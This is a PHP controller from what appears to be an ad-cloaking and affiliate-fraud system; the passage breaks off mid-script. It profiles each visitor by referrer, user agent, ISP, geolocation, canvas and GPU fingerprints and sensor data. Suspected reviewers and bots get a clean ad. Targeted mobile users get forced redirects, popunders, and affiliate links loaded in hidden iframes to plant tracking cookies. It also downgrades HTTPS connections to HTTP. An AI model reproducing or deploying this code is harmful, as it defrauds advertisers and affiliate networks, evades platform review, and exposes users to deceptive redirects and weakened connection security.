<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Ad extends CI_Controller {

    private $allowed_user_agents = "iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10";
	public function __construct() {
		parent::__construct();
		$this->load->model("ad_model");
		define("EMPTY_REFERER","_EMPTY_");
	}

	public function index()
	{
		$this->show_not_found();
	}

    public function debug($id) {
        $this->load->view("debug/iframe_ad_view",array("id"=>"$id"));
    }

    public function debug_iframe($id) {
        $this->load->view("debug/iframe2_ad_view",array("id"=>"$id"));
    }

	public function debug_iframe2($id=null) {

	    header("X-Frame-Options: SAMEORIGIN");
	    echo "USER AGENT: ".$_SERVER['HTTP_USER_AGENT'];
        $this->allowed_user_agents = "iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10|Chrome";
        $data = $this->input->post();
        if (!empty($data)) {
            $this->load->helper("ad_helper");
            $this->load->helper("csv_helper");
            $this->load->helper("array_helper");
            handleTrafficLoggerData($id);
            return;
        }
        if ($id == null) {
            $this->show_not_found();
            return;
        }
        /** @var $ad_data Ad_data */
        $ad_data = $this->ad_model->get($id);
        if ($ad_data == null) {
            $this->show_not_found();
            return;
        }
        $ad_data->platform_whitelist = array("iphone","linux armv","Win32");
        $ad_data->redirectMethod = "windowlocation";
//        $ad_data->forceDirtyAd = true;
        $this->_view($id,$ad_data, $data);
    }

    public function show($id) {
	    $this->view($id);
        //$this->load->view("ad/iframe_ad_view",array("url"=>site_url("ad/view/$id")));
    }

    // Shows the ad on a full html page (forced)
    public function force_view($id=null)
    {
        $this->allowed_user_agents = "iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10|Chrome";
        $data = $this->input->post();
        if (!empty($data)) {
            $this->load->helper("ad_helper");
            $this->load->helper("csv_helper");
            $this->load->helper("array_helper");
            handleTrafficLoggerData($id);
            return;
        }
        if ($id == null) {
            $this->show_not_found();
            return;
        }
        /** @var $ad_data Ad_data */
        $ad_data = $this->ad_model->get($id);
        if ($ad_data == null) {
            $this->show_not_found();
            return;
        }
        $ad_data->platform_whitelist = array("iphone","linux armv","Win32");
//        $ad_data->forceDirtyAd = true;
        $ad_data->iframeCloakingEnabled = false;
        $this->_view($id,$ad_data, $data);
    }

    // Shows the ad on a full html page
	public function view($id=null)
    {
        $data = $this->input->post();
        if (!empty($data)) {
            $this->load->helper("ad_helper");
            $this->load->helper("csv_helper");
            $this->load->helper("array_helper");
            handleTrafficLoggerData($id);
            return;
        }
        if ($id == null) {
            $this->show_not_found();
            return;
        }
        $ad_data = $this->ad_model->get($id);
        if ($ad_data == null) {
            $this->show_not_found();
            return;
        }
        $this->_view($id,$ad_data, $data);
    }


    // Shows the popunder landing page with the cookies
    public function viewc($id=null)
    {
        $this->load->helper("ad_helper");
        $this->load->helper("js_helper");
        $this->load->helper("array_helper");
        $this->load->helper("csv_helper");
        $this->load->helper("shared_file_access_helper");
        $data = $this->input->post();
        if (!empty($data)) {
            handleTrafficLoggerData($id);
            return;
        }
        if ($id == null) {
            $this->show_not_found();
            return;
        }
        $ad_data = $this->ad_model->get($id);
        if ($ad_data == null || !$ad_data->cookies_dropping_enabled || $ad_data->cookies_dropping_method != COOKIES_DROPPING_METHOD_POP_UNDER) {
            $this->show_not_found();
            return;
        }
        // Set ad.php click ID cookie
        $adClickID = uniqid("", true);
        setcookie("_c", $adClickID, strtotime("+1 year"));

        // ad.php visits
        $adVisits = isset($_COOKIE["_v"]) ? $_COOKIE["_v"] + 1 : 1;
        setcookie("_v", $adVisits, strtotime("+1 year"));
        $queryString = $_SERVER['QUERY_STRING'];

        $f_apps_WeightList["iOS"] 		= getCSVContentAsArray(F_APPS_IOS_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
        $f_apps_WeightList["Android"] 	= getCSVContentAsArray(F_APPS_ANDROID_BASE_FILENAME. $ad_data->adCountry . CSV_FILE_SUFFIX);
        $f_site_WeightList 				= getCSVContentAsArray(F_SITE_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
        $f_siteid_WeightList 			= getCSVContentAsArray(F_SITE_ID_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);

        $scriptCode = "<script type=\"text/javascript\">
                                (function() {
                                var packageName = 'dreamsky';
                                 if (!window[packageName]) {
                                     window[packageName] = {};
                                 }
                                 var tool = {
                                     ismobile: function() {
                                         if (!(('ontouchstart' in window) || (navigator.MaxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0))) {
                                             return false;
                                         }
                                         return true;
                                     },
                                     writeOffer: function(url) {
                                         var offerUrl = (url.indexOf('?') !== -1?url + '&':url + '?') + location.search.substring(1);
                                         document.write('<iframe src=\"' + offerUrl + '\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>');
                                     },
                                 }
                                 window[packageName]['tool'] = tool;
                             })();
                             if (dreamsky.tool.ismobile()) {";
        foreach($ad_data->affiliate_link_url_list as $cookieUrl) {
            if (strlen($cookieUrl) > 0) {
                $cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
                if ($ad_data->voluumAdCycleCount > 0)
                {
                    $cookieUrl = appendParameterPrefix($cookieUrl) . "ad=" . (($adVisits % $ad_data->voluumAdCycleCount) + 1);
                }
                // Append auto generated source parameter
                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_apps", $f_apps_WeightList);
                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_site", $f_site_WeightList);
                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_siteid", $f_siteid_WeightList);
                $cookieUrl = appendParameterPrefix($cookieUrl) . "campaign_id=" . $id;
                $cookieUrl = appendParameterPrefix($cookieUrl) . $queryString;
                // Finally. add the iframe code
                $scriptCode .= "    dreamsky.tool.writeOffer('" . $cookieUrl. "');";
            }
        }
        $scriptCode .= "} </script> ";
        $result = $ad_data->popunder_template;
        $result = str_replace("{script}",$scriptCode,$result);
        $result = str_replace("{baseUrl}",base_url(""),$result);
        $result = str_replace("{assetsUrl}",base_url("assets"),$result);
        echo $result;
//        $this->load->view("content/landing_view",array("script_code"=>$scriptCode,"content_url"=>base_url("content")));
    }

    public function landing_js_loader()
    {
        $this->load->helper("js_helper");
        echo get_js_view("cookies_preloader", array('url'=>site_url("ad/landing_js")),false);
    }

    // Shows the popunder landing page with the cookies
    public function landing_js()
    {
        $this->load->helper("ad_helper");
        $this->load->helper("js_helper");
        $this->load->helper("array_helper");
        $this->load->helper("csv_helper");
        $this->load->helper("shared_file_access_helper");
        $this->set_output_to_js();
        $this->disable_client_cache();
        $clean_js = "var landing=window.location;";
        $id = $this->input->get("campaign_id");
        // If no ID provided serve clean js
        if ($id == null) {
            echo $clean_js."\nvar id=0;";
            return;
        }
        $ad_data = $this->ad_model->get($id);
        // If ID provided but not found, serve clean js
        if ($ad_data == null ) {
            echo $clean_js."\nvar id=0;";
            return;
        }
        if (!$ad_data->cookies_dropping_enabled || $ad_data->cookies_dropping_method != COOKIES_DROPPING_METHOD_LANDING_PAGE) {
            echo $clean_js."\nvar id=1;";
            return;
        }

        $referer = trim(array_key_exists("HTTP_REFERER", $_SERVER)?$_SERVER['HTTP_REFERER']:"");
        $lp_referer = trim(array_key_exists("lpreferer", $_GET)?$_GET['lpreferer']:"");
        // Preprocess referrer for usage
        if (strlen($referer) == 0)
        {
            $referer = "_empty_";
        }
        if (strlen($lp_referer) == 0)
        {
            $lp_referer = "_empty_";
        }



        // If Referrer is blacklisted serve clean js
        foreach ($ad_data->cookies_dropping_referer_blacklist as $blackListedReferrer)
        {
            if (strpos($referer, $blackListedReferrer) !== false)
            {
                echo $clean_js."\nvar id=2;";
                return;
            }
        }

        // If whitelist has records and there is no match with Referer, serve clean js
        $checkWhitelist = false;
        $whiteListed = false;
        foreach ($ad_data->cookies_dropping_referer_whitelist as $whitelistedReferrer)
        {
            $checkWhitelist = true;
            if (strpos($referer, $whitelistedReferrer) !== false)
            {
                $whiteListed = true;
                break;
            }
        }
        if ($checkWhitelist && !$whiteListed) {
            echo $clean_js."\nvar id=3;";
            return;
        }

        // If LP Referrer is blacklisted serve clean js
        foreach ($ad_data->cookies_dropping_landing_page_referer_blacklist as $blackListedReferrer)
        {
            if (strpos($lp_referer, $blackListedReferrer) !== false)
            {
                echo $clean_js."\nvar id=20;";
                return;
            }
        }

        // If whitelist has records and there is no match with lp Referer, serve clean js
        $checkWhitelist = false;
        $whiteListed = false;
        foreach ($ad_data->cookies_dropping_landing_page_referer_whitelist as $whitelistedReferrer)
        {
            $checkWhitelist = true;
            if (strpos($lp_referer, $whitelistedReferrer) !== false)
            {
                $whiteListed = true;
                break;
            }
        }
        if ($checkWhitelist && !$whiteListed) {
            echo $clean_js."\nvar id=30;";
            return;
        }

        // Cloack user agent
        if (!preg_match('/('.$this->allowed_user_agents.')/i', $_SERVER['HTTP_USER_AGENT']))
        {
            echo $clean_js."\nvar id=8;";
            return;
        }

        // Cloak ISP
        if ($ad_data->ispCloakingEnabled)
        {
            $blacklistedSubDivs1 	= array();
            $blacklistedSubDivs2 	= array();
            $blacklistedCountries 	= array();
            $blacklistedContinents 	= array();
            $ip  = getClientIP();
            $geo = getGEOInfo($ip);
            $isp = getISPInfo($ip);

            $allowedIsps = array();

            if (array_key_exists($ad_data->adCountry, $ad_data->allowedIspsPerCountry))
            {
                $allowedIsps = $ad_data->allowedIspsPerCountry[$ad_data->adCountry];
            }

            if ((empty($allowedIsps) || in_array($isp["isp"], $allowedIsps)) &&
                !in_array($geo['city'], $ad_data->blacklistedCities) &&
                !in_array($geo['province'], $ad_data->blacklistedProvinces) &&
                !in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
                !in_array($geo['subdiv2_code'], $blacklistedSubDivs2) &&
                !in_array($geo['country'], $blacklistedCountries) &&
                !in_array($geo['continent'], $blacklistedContinents))
            {
            }
            else
            {
                echo $clean_js;
                return;
            }
        }
        // Set ad.php click ID cookie
        $adClickID = uniqid("", true);
        setcookie("_c", $adClickID, strtotime("+1 year"));

        // ad.php visits
        $adVisits = isset($_COOKIE["_v"]) ? $_COOKIE["_v"] + 1 : 1;
        setcookie("_v", $adVisits, strtotime("+1 year"));

        $queryString = $_SERVER['QUERY_STRING'];

        $f_apps_WeightList["iOS"] 		= getCSVContentAsArray(F_APPS_IOS_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
        $f_apps_WeightList["Android"] 	= getCSVContentAsArray(F_APPS_ANDROID_BASE_FILENAME. $ad_data->adCountry . CSV_FILE_SUFFIX);
        $f_site_WeightList 				= getCSVContentAsArray(F_SITE_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
        $f_siteid_WeightList 			= getCSVContentAsArray(F_SITE_ID_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);

        $affiliate_link_url_list = array();
        foreach ($ad_data->affiliate_link_url_list as $cookieUrl) {
            if (strlen($cookieUrl) > 0) {
                $cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
                if ($ad_data->voluumAdCycleCount > 0)
                {
                    $cookieUrl = appendParameterPrefix($cookieUrl) . "ad=" . (($adVisits % $ad_data->voluumAdCycleCount) + 1);
                }
                // Append auto generated source parameter
                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_apps", $f_apps_WeightList);
                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_site", $f_site_WeightList);
                $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_siteid", $f_siteid_WeightList);
                $cookieUrl = appendParameterPrefix($cookieUrl) . "campaign_id=" . $id;
                $cookieUrl = appendParameterPrefix($cookieUrl) . $queryString;
                // Finally. add the iframe code
                $affiliate_link_url_list[] = $cookieUrl;
            }
        }
        // Serve dirty javascript
        echo get_js_view("cookies_loader", array('affiliate_link_url_list'=>$affiliate_link_url_list,'allowed_platforms'=>join("|", $ad_data->platform_whitelist)),false);
    }

    private function get_redirect_code($ad_data, $redirectUrl) {
        if ($ad_data->redirectMethod === "trycatchredirect")
        {
            return "try
                                 {
                                     " . getRedirectCode($ad_data->redirectSubMethod1, $redirectUrl) . "
                                 }
                                 catch(e)
                                 {
                                    try
                                    {
                                        " . getRedirectCode($ad_data->redirectSubMethod2, $redirectUrl) . "
                                    }
                                    catch(e)
                                    {
                                    }
                                 }";
        }
        else
        {
            return getRedirectCode($ad_data->redirectMethod, $redirectUrl);
        }
    }

    /* Get the page referer or a default value for it */
    private function GetReferer($default = "Unknown")
    {
        /* If dealing with a GET request, and an override of the referrer is provided, use it */
        if ($_SERVER['REQUEST_METHOD'] === 'GET') {
            if (array_key_exists("org_referer", $_GET)) {
                return urldecode($_GET["org_referer"]);
            }
        }

        return array_key_exists('HTTP_REFERER', $_SERVER)
            ? $_SERVER['HTTP_REFERER']
            : $default;
    }


    private function _view($id, $ad_data, $data)
    {
        $debug = $this->input->get("debug") == "true"?true:false;
        if ($debug) {
            $ad_data->redirectEnabled = true;
        }
        // Load required helpers
        $this->load->helper("ad_helper");
        $this->load->helper("js_helper");
        $this->load->helper("array_helper");
        $this->load->helper("csv_helper");
        $this->load->helper("shared_file_access_helper");

        // Get the HTTP Referer
        $http_referer = $this->GetReferer(EMPTY_REFERER);

        /* If the page was served as HTTPS and we are asked to downgrade to HTTP ... */
        if ($ad_data->https_to_http && $this->served_by_https()) {
            /* Get the equivalent HTTP URL */
        	$http_url = "http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];

            /* Get the referrer of this site and append it as the last url parameter */
            if (strpos($http_url,'?') !== false) {
                $http_url .= '&org_referer='.urlencode($http_referer);
            } else {
                $http_url .= '?org_referer='.urlencode($http_referer);
            }

            /* Perform a redirection to it */
        	header("HTTP/1.1 301 Moved Permanently");
        	header("Location: ".$http_url, true, 301);
        	exit;
        }

        // Set ad.php click ID cookie
		$adClickID = uniqid("", true);
		setcookie("_c", $adClickID, strtotime("+1 year"));

		// ad.php visits
		$adVisits = isset($_COOKIE["_v"]) ? $_COOKIE["_v"] + 1 : 1;
		setcookie("_v", $adVisits, strtotime("+1 year"));

        $campaignID = $id;
		$queryString = $_SERVER['QUERY_STRING'];

        $blacklistedSubDivs1 	= array();
        $blacklistedSubDivs2 	= array();
        $blacklistedCountries 	= array();
        $blacklistedContinents 	= array();

        $ip  = getClientIP();
        $geo = getGEOInfo($ip);
        $isp = getISPInfo($ip);

        if ($ad_data->loggingEnabled)
        {
            adlog($campaignID, $ip, $isp["isp"],
                "INFO:GEO:" .
                'ip:"'.$ip.'",'.
                'isp:"'.$isp["isp"].'",'.
                'city:"'.$geo['city'].'",'.
                'province:"'.$geo['province'].'",'.
                'country:"'.$geo['country'].'",'.
                'country_code:"'.$geo['country_code'].'",'.
                'continent:"'.$geo['continent'].'",'.
                'continent_code:"'.$geo['continent_code'].'",'.
                'subdiv1:"'.$geo['subdiv1'].'",'.
                'subdiv1_code:"'.$geo['subdiv1_code'].'",'.
                'subdiv2:"'.$geo['subdiv2'].'",'.
                'subdiv2_code:"'.$geo['subdiv2_code'].'"');
        }

        $trackingPixelCloakTestParameters = array();

        if ($ad_data->trafficLoggerEnabled)
        {
            $serveCleanAd = true;

            if ($ad_data->loggingEnabled)
            {
                adlog($campaignID, $ip, $isp["isp"], "Traffic Logger Enabled.");
            }
        }
        else
        {
            $serveCleanAd = false;
        }

        //
        if (!$serveCleanAd)
        {
            foreach ($ad_data->blacklistedReferrers as $blackListedReferrer)
            {
                if (strpos($http_referer, $blackListedReferrer) !== false)
                {
                    $serveCleanAd = true;

                    if ($ad_data->loggingEnabled)
                    {
                        mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_BLACKLIST_BLOCKED:$http_referer: Referrer $http_referer is in blacklist.");
                    }

                    break;
                }
            }

            if (!$serveCleanAd && $ad_data->loggingEnabled)
            {
                mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_BLACKLIST_ALLOWED:$http_referer: Referrer $http_referer is NOT in blacklist.");
            }

            if (!$serveCleanAd && !empty($ad_data->whitelistedReferrers))
            {
                $matchedWhitelistedReferrer = false;

                foreach ($ad_data->whitelistedReferrers as $whitelistedReferrer)
                {
                    if (strpos($http_referer, $whitelistedReferrer) !== false)
                    {
                        $matchedWhitelistedReferrer = true;

                        break;
                    }
                }

                if (!$matchedWhitelistedReferrer)
                {
                    $serveCleanAd = true;

                    if ($ad_data->loggingEnabled)
                    {
                        mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_WHITELIST_BLOCKED:$http_referer: Referrer $http_referer is not in whitelist.");
                    }
                }
                elseif ($ad_data->loggingEnabled)
                {
                    mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_WHITELIST_ALLOWED:$http_referer: Referrer $http_referer is in whitelist.");
                }
            }
        }

        // Check querystring parameters against blocked parameter values
        if (!$serveCleanAd)
        {
            foreach ($ad_data->blockedParameterValues as $parameter => $blockedValues)
            {
                if (array_key_exists($parameter, $_GET))
                {
                    if (in_array($_GET[$parameter], $blockedValues))
                    {
                        $serveCleanAd = true;

                        if ($ad_data->loggingEnabled)
                        {
                            mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_BLOCKED:$parameter:$_GET[$parameter]: Parameter $parameter has blocked value: $_GET[$parameter].");
                        }

                        break;
                    }
                    else if ($ad_data->loggingEnabled)
                    {
                        mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_ALLOWED:$parameter:$_GET[$parameter]: Parameter $parameter with value $_GET[$parameter] is allowed.");
                    }
                }
                else
                {
                    $serveCleanAd = true;

                    if ($ad_data->loggingEnabled)
                    {
                        mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_MISSING:$parameter: Parameter $parameter missing from querystring.");
                    }

                    break;
                }
            }
        }

        // Check referrer querystring parameters against blocked parameter values

        $referrerParameters = array();
        parse_str(parse_url($http_referer, PHP_URL_QUERY), $referrerParameters);

        if (!$serveCleanAd)
        {
            foreach ($ad_data->blockedReferrerParameterValues as $parameter => $blockedValues)
            {
                if (array_key_exists($parameter, $referrerParameters))
                {
                    if (in_array($referrerParameters[$parameter], $blockedValues))
                    {
                        $serveCleanAd = true;

                        if ($ad_data->loggingEnabled)
                        {
                            mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_BLOCKED:$parameter:$referrerParameters[$parameter]: Parameter $parameter has blocked value: $referrerParameters[$parameter].");
                        }

                        break;
                    }
                    else if ($ad_data->loggingEnabled)
                    {
                        mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_ALLOWED:$parameter:$referrerParameters[$parameter]: Parameter $parameter with value $referrerParameters[$parameter] is allowed.");
                    }
                }
                else
                {
                    $serveCleanAd = true;

                    if ($ad_data->loggingEnabled)
                    {
                        mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_MISSING:$parameter: Parameter $parameter missing from referrer querystring.");
                    }

                    break;
                }
            }
        }

        if (!$serveCleanAd && !preg_match('/('.$this->allowed_user_agents.')/i', $_SERVER['HTTP_USER_AGENT']))
        {
            $serveCleanAd = true;

            if ($ad_data->loggingEnabled)
            {
                adlog($campaignID, $ip, $isp["isp"], "CHECK:USERAGENT_MOBILE:$_SERVER[HTTP_USER_AGENT]: UserAgent is not a mobile device.");
            }
        }
        elseif (!$serveCleanAd && $ad_data->ispCloakingEnabled)
        {
            $allowedIsps = array();

            if (array_key_exists($ad_data->adCountry, $ad_data->allowedIspsPerCountry))
            {
                $allowedIsps = $ad_data->allowedIspsPerCountry[$ad_data->adCountry];
            }

            if ((empty($allowedIsps) || in_array($isp["isp"], $allowedIsps)) &&
                !in_array($geo['city'], $ad_data->blacklistedCities) &&
                !in_array($geo['province'], $ad_data->blacklistedProvinces) &&
                !in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
                !in_array($geo['subdiv2_code'], $blacklistedSubDivs2) &&
                !in_array($geo['country'], $blacklistedCountries) &&
                !in_array($geo['continent'], $blacklistedContinents))
            {
                $serveCleanAd - false; // TODO WTH IS THIS

                $trackingPixelCloakTestParameters[] = "ispAllowed=" . urlencode($isp["isp"]);

                if ($ad_data->loggingEnabled)
                {
                    adlog($campaignID, $ip, $isp["isp"], "CHECK:GEO_ALLOWED: ISP/Geo is allowed. ISP: " . $isp["isp"]);
                }
            }
            else
            {
                $serveCleanAd = true;

                $trackingPixelCloakTestParameters[] = "ispBlocked=" . urlencode($isp["isp"]);

                if ($ad_data->loggingEnabled)
                {
                    adlog($campaignID, $ip, $isp["isp"], "CHECK:GEO_BLOCKED: ISP/Geo is NOT allowed. ISP: " . $isp["isp"]);
                }
            }
        }

        // Check for the platform to be in the whitelist, if any whitelist supplied
        if (!$serveCleanAd &&
            count($ad_data->user_agent_whitelist) > 0 &&
            !preg_match( '/('.join('|', $ad_data->user_agent_whitelist).')/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {

            $serveCleanAd = true;

            if ($ad_data->loggingEnabled)
            {
                adlog($campaignID, $ip, $isp["isp"], "CHECK:USERAGENT_MOBILE:$_SERVER[HTTP_USER_AGENT]: Mobile device is not on platform whitelist");
            }
        }

        $referrerDomainScript = "function getReferrerDomain()
						     {
					            var topDomain = '';

					            try
					            {
					                topDomain = window.top.location.href;
					            }
					            catch(e) { }

					            if (topDomain == null || topDomain === 'undefined' || typeof topDomain == 'undefined' || topDomain.trim() === '')
					            {
					                topDomain = document.referrer;
					            }

					            return topDomain;
						     }";
        $trackingPixelUrl = $ad_data->trackingPixelUrl;
        if ($ad_data->trackingPixelEnabled && !empty($trackingPixelUrl))
        {
            if (!empty($trackingPixelCloakTestParameters))
            {
                // Append cloaking test results for Voluum
                $trackingPixelUrl = appendParameterPrefix($trackingPixelUrl);
                $trackingPixelUrl .= implode("&", $trackingPixelCloakTestParameters);
            }

            // Append referrer
            $trackingPixelUrl = appendReferrerParameter($trackingPixelUrl);

            $trackingPixelScript = "function addTrackingPixel()
						        {
						            var topDomain = getReferrerDomain();

						            var el = document.createElement('img');
						            el.src = '$trackingPixelUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
						            el.width = 0;
						            el.height = 0;
						            el.border = 0;
						            document.body.appendChild(el);
						        }";
        }

        if ($serveCleanAd && !$ad_data->forceDirtyAd)
        {
            if ($ad_data->loggingEnabled && !$ad_data->redirectEnabled)
            {
                adlog($campaignID, $ip, $isp["isp"], "CHECK:REDIRECT_DISABLED: Redirect disabled.");
            }

            $scriptElements = array();
            $onloadElements = array();

            if ($ad_data->trackingPixelEnabled && !empty($trackingPixelUrl))
            {
                $scriptElements[] = minify("<script type=\"text/javascript\">\n" . $referrerDomainScript . $trackingPixelScript . "\n</script>");
                $onloadElements[] = "addTrackingPixel();";
            }

            if ($ad_data->trafficLoggerEnabled)
            {
                $scriptElements[] = "<script src=\"".get_js_url("motionDetector.js")."\"></script>";
                $scriptElements[] = "<script src=\"".get_js_url("orientationDetector.js")."\"></script>";
                $scriptElements[] = "<script src=\"".get_js_url("lg.js")."\"></script>";
                $onloadElements[] = "f.go('" . getCurrentPageUrl() . "?');";
            }

            $resultHtml = str_replace("{script}", implode("\n", $scriptElements), $ad_data->resultHtml);
            $resultHtml = str_replace("{baseUrl}",base_url(""),$resultHtml);
            $resultHtml = str_replace("{assetsUrl}",base_url("assets"),$resultHtml);
            $resultHtml = str_replace("{onload}", !empty($onloadElements) ? " onload=\"" . implode("", $onloadElements) . "\"" : "", $resultHtml);

            if ($ad_data->outputMethod === "JS")
            {
                $resultHtml = str_replace("{queryString}", $queryString, $resultHtml);

                $resultHtml = createJSCode($resultHtml);
            }
        }
        else
        {
            // DIRTY PAGE

            if ($ad_data->loggingEnabled)
            {
                allowedTrafficLog($campaignID, $ip, $isp["isp"]);

                if ($ad_data->forceDirtyAd)
                {
                    adlog($campaignID, $ip, $isp["isp"], "Force Dirty Ad enabled.");
                }
            }


            if (!empty($ad_data->redirectUrl) && $ad_data->redirectEnabled ) {
                $redirectUrl = appendParameterPrefix($ad_data->redirectUrl) . "ccid=$adClickID";

                if ($ad_data->voluumAdCycleCount > 0)
                {
                    $redirectUrl = appendParameterPrefix($redirectUrl) . "ad=" . (($adVisits % $ad_data->voluumAdCycleCount) + 1);
                }

                // Add campaign Id
                $redirectUrl = appendParameterPrefix($redirectUrl) . "campaign_id=" . $id;


                $f_apps_WeightList["iOS"] 		= getCSVContentAsArray(F_APPS_IOS_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
                $f_apps_WeightList["Android"] 	= getCSVContentAsArray(F_APPS_ANDROID_BASE_FILENAME. $ad_data->adCountry . CSV_FILE_SUFFIX);
                $f_site_WeightList 				= getCSVContentAsArray(F_SITE_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);
                $f_siteid_WeightList 			= getCSVContentAsArray(F_SITE_ID_BASE_FILENAME . $ad_data->adCountry . CSV_FILE_SUFFIX);

                if ($debug){
                }
                // Append auto generated source parameter
                $redirectUrl = appendAutoRotateParameter($redirectUrl, "f_apps", $f_apps_WeightList);
                $redirectUrl = appendAutoRotateParameter($redirectUrl, "f_site", $f_site_WeightList);
                $redirectUrl = appendAutoRotateParameter($redirectUrl, "f_siteid", $f_siteid_WeightList);

                // Append passed in script parameters if outputMethod == JS
                if ($ad_data->outputMethod === "JS")
                {
                    $redirectUrl = appendParameterPrefix($redirectUrl) . $queryString;
                }

                // Append referrer
                $redirectUrl = appendReferrerParameter($redirectUrl);

                if ($ad_data->loggingEnabled)
                {
                    adlog($campaignID, $ip, $isp["isp"], $redirectUrl);
                }

                $redirectCode = $this->get_redirect_code($ad_data, $redirectUrl);
            } else {
                $redirectCode = "";
            }

            $cookiesCode = "";
            if ($ad_data->cookies_dropping_enabled && $ad_data->cookies_dropping_method == COOKIES_DROPPING_METHOD_POP_UNDER) {
                $cookiesCode = "var url = '".site_url("ad/viewc/$id")."';";
                $cookiesCode .= "var cookiesUrl = (url.indexOf('?') !== -1?url + '&':url + '?')+'referrer=' + encodeURIComponent(getReferrerDomain()) + '&' + location.search.substring(1);";
                $cookiesCode .= "makePopunder(cookiesUrl);";
            }
            if ($ad_data->cookies_dropping_enabled && $ad_data->cookies_dropping_method == COOKIES_DROPPING_METHOD_CLOAKER) {
                foreach($ad_data->affiliate_link_url_list as $cookieUrl) {
                    if (strlen($cookieUrl) > 0) {
                        $cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
                        if ($ad_data->voluumAdCycleCount > 0)
                        {
                            $cookieUrl = appendParameterPrefix($cookieUrl) . "ad=" . (($adVisits % $ad_data->voluumAdCycleCount) + 1);
                        }
                        // Append auto generated source parameter
                        $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_apps", $f_apps_WeightList);
                        $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_site", $f_site_WeightList);
                        $cookieUrl = appendAutoRotateParameter($cookieUrl, "f_siteid", $f_siteid_WeightList);
                        $cookieUrl = appendParameterPrefix($cookieUrl) . "campaign_id=" . $id;

                        // Append passed in script parameters if outputMethod == JS
                        if ($ad_data->outputMethod === "JS")
                        {
                            $cookieUrl = appendParameterPrefix($cookieUrl) . $queryString;
                        }
                        // Append referrer
                        $cookieUrl = appendReferrerParameter($cookieUrl);

                        // Finally. add the iframe code
                        $cookiesCode .= "addIframe(\"".$cookieUrl."\");";
                    }
                }
            }


            $scriptCode = "<script type=\"text/javascript\">
                        

						var testResults = [];

						function isTrue(value)
						{
							return value === true;
						}

                        function addIframe(url) 
                        {
                            var iframe = document.createElement('iframe');
                            iframe.style.display = 'none';
                            iframe.src = (url.indexOf('?') !== -1?url + '&':url + '?')+'referrer=' + encodeURIComponent(getReferrerDomain()) + '&' + location.search.substring(1);
                            iframe.sandbox = 'allow-top-navigation allow-popups allow-scripts allow-same-origin';                            
                            document.body.appendChild(iframe);
                        }

						if (typeof jslog !== 'function')
						{
							jslog = function(text) { " . ($ad_data->consoleLoggingEnabled ? "console.log(text);" : "") . " }
						}\n\n" .

                ($ad_data->trackingPixelEnabled && !empty($ad_data->trackingPixelUrl) ? $trackingPixelScript : "") .
                (($ad_data->cookies_dropping_enabled && $ad_data->cookies_dropping_method == COOKIES_DROPPING_METHOD_POP_UNDER) ? get_js("popunder.js") : "") .
                ($ad_data->iframeCloakingEnabled ? get_js("iframetest.js") : "") .
                ($ad_data->pluginCloakingEnabled ? get_js("plugintest.js") : "") .
                ($ad_data->touchCloakingEnabled ? get_js("touchtest.js") : "") .
                ($ad_data->motionCloakingEnabled ? get_js("motionDetector.js")." " : "") .
                ($ad_data->orientationCloakingEnabled ? get_js("orientationDetector.js")." " : "").
                ($ad_data->glVendorCheckEnabled ? " var getBlockedGLVendorList = function () { return [".$ad_data->blockedGLVendors."];}; \n ". get_js("glvendorTest.js"). " " : "") .
                ($ad_data->canvasFingerprintCheckEnabled && !empty($ad_data->blockedCanvasFingerprints) ? get_js("canvasfingerprinttest.js").
                    "
					   	function inBlockedCanvasList()
						{
							var blockedList = [null, ".$ad_data->blockedCanvasFingerprints."];
							var canvasFingerPrint = getCanvasFingerprint();

							var result = blockedList.indexOf(canvasFingerPrint) !== -1;

							if (result)
							{
								jslog('CHECK:CANVASFINGERPRINT_BLOCKED: CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
							}
							else
							{
								jslog('CHECK:CANVASFINGERPRINT_ALLOWED: CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
							}

							return result;
						}\n": "")."

						$referrerDomainScript

						function go()
						{\n var timeoutValue = 0; \n" .
